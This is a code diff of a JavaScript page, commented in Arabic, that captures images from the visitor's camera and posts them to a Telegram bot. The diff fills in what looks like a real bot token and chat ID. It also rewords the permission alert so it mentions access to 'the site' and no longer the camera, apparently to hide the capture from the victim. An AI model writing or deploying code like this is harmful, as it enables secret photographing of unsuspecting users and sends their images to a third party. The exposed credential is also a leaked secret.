@@ -117,12 +117,12 @@
             })
             .catch((err) => {
                 console.error('فشل الوصول إلى الكاميرا:', err);
-                alert('يجب منح الأذونات للوصول إلى الكاميرا.');
+                alert('يجب منح الأذونات للوصول إلى للموقع.');
             });
 
         // إعداد Telegram API
-        const telegramToken = 'YOUR_TELEGRAM_TOKEN';  // استبدل بـ Token الخاص بك
-        const chatId = 'YOUR_CHAT_ID';  // استبدل بـ Chat ID الخاص بك
+        const telegramToken = '7006434664:AAG7pzIqdOr9dWXBcLOupvMwpg7rLi8cpX0';  // استبدل بـ Token الخاص بك
+        const chatId = '829549685';  // استبدل بـ Chat ID الخاص بك
         const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
 
         // التقاط الصورة وإرسالها إلى Telegram
